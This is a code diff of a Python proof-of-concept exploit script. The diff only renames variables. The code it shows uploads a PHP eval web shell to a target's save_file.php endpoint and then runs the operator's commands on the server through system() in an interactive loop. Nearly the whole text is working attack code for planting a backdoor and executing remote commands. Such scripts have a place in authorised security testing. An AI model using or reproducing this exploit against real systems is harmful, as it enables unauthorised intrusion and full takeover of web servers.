@@ -15,10 +15,10 @@ def poc():
             exit()
 
         password = raw_input("[*] Please enter the shell-password:")
-        phpShell = "<?php eval($_POST['" + password + "']);?>"
+        shell_content = "<?php eval($_POST['" + password + "']);?>"
         shellName = "test.php"
-        postData = {'content': phpShell, 'src': shellName}
-        r = requests.post(target.url, data=postData)
+        post_data = {'content': shell_content, 'src': shellName}
+        r = requests.post(target.url, data=post_data)
 
         shell = target.url.replace("save_file.php", shellName)
 
@@ -27,8 +27,8 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {password: payload}
-                    r = requests.post(shell, data=postData)
+                    post_data = {password: payload}
+                    r = requests.post(shell, data=post_data)
                     print(r.text.encode(r.encoding))
                 else:
                     break
